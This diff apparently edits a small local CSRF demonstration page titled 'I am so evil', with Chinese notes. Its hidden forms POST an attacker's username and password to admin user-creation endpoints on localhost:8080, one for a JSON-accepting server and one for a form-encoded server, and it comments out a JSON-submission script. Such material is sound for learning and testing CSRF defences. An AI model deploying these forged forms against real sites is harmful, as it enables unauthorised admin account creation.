@@ -10,19 +10,31 @@
     <title>😱I am so evil.</title>
 </head>
 <body>
-<form action="http://localhost:8080/admin/user" method="post">
+
+<p>1. server端Accept `application/json`</p>
+
+<form id="form1" action="http://localhost:8080/admin/user" method="post">
     <input name="username" type="hidden" value="evil-user">
     <input name="password" type="hidden" value="evil-password">
-    <input type="submit" value="submit"/>
+    <input type="submit" value="submit not work(/admin/user)"/>
 </form>
 
+<p>2. server端Accept `application/x-www-form-urlencoded`</p>
+
+<form id="form2" action="http://localhost:8080/admin/users" method="post">
+    <input name="username" type="hidden" value="evil-user">
+    <input name="password" type="hidden" value="evil-password">
+    <input type="submit" value="submit works(/admin/users)"/>
+</form>
+
+
 <script type="text/javascript">
-    console.log($("form"))
-    $("form").submit(function (event) {
-        console.log('submit ...')
-        event.preventDefault();
-        submitAsJSON(this);
-    });
+    // console.log($("form"))
+    // $("form1").submit(function (event) {
+    //     console.log('submit ...')
+    //     event.preventDefault();
+    //     submitAsJSON(this);
+    // });
 </script>
 </body>
 </html>
